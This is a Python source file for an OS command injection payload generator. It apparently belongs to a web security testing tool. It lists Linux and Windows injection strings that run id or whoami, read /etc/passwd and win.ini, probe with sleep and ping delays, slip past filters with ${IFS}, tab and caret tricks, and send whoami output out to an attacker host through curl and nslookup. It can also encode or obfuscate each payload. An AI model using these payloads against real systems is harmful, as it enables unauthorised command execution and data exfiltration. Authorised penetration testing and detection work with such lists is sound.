from utils import encoder
from utils import obfuscator

class OSCmdPayloadGenerator:
    def __init__(self):
        self.payloads = {
            "linux": [
                "; id",
                "| id",
                "&& id",
                "|| id",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "&& cat /etc/passwd",
                "; sleep 5",
                "| sleep 5",
                "; ping -c 3 127.0.0.1",
                "; curl attacker.com/$(whoami)",
                "; nslookup $(whoami).attacker.com",
                ";cat${IFS}/etc/passwd",
                "|cat${IFS}/etc/passwd",
                ";cat%09/etc/passwd"
            ],
            "windows": [
                "& whoami",
                "| whoami",
                "&& whoami",
                "& dir",
                "| dir",
                "&& dir",
                "& type C:\\Windows\\win.ini",
                "| type C:\\Windows\\win.ini",
                "& ping 127.0.0.1 -n 5",
                "& powershell -c Get-Process",
                "& ty^pe C:\\Windows\\win.ini",
                "& di^r"
            ]
        }

    def generate(self, os_type="linux", encode=None, obfuscate=False):

        if os_type not in ["linux", "windows", "all"]:
            raise ValueError("Invalid os_type. Valid options: 'linux', 'windows', 'all'")

        if os_type == "all":
            base_payloads = self.payloads["linux"] + self.payloads["windows"]
        else:
            base_payloads = self.payloads[os_type]

        processed = []

        for payload in base_payloads:
            if encode:
                payload = encoder.encode(payload, encode)
            if obfuscate:
                payload = obfuscator.obfuscate(payload)
            processed.append(payload)

        return processed
